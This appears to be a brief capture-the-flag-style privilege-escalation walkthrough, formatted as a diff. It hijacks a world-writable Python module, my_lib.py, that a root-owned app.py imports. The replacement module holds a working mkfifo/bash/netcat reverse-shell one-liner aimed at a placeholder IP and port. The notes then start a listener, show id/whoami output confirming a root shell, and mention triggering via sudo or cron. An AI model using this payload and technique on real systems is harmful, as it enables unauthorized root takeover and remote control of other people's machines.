@@ -1,0 +1,28 @@
+$ ls -la ./
+-rwx-rwx-rwx    root  user    .
+-rwx-r-x-r-x    root  root    app.py
+-rw--rw--r--    root  user    my_lib.py
+...
+$ cat app.py
+...
+import my_lib
+
+my_lib.test()
+...
+(DELETE my_lib.py and CREATE my_lib.py and EDIT my_lib.py)
+$ cat > my_lib.py
+def test():
+  import os
+  os.system("mkfifo /tmp/r;cat /tmp/r|/bin/bash -i 2>&1|nc <ip> <port> > /tmp/r")
+^C
+root@kali:~# nc -lvnp <your_port>
+...
+Wait 
+AND I AM ROOT !!!
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+$ sudo ./app.py
+OR wait cron actuation
+
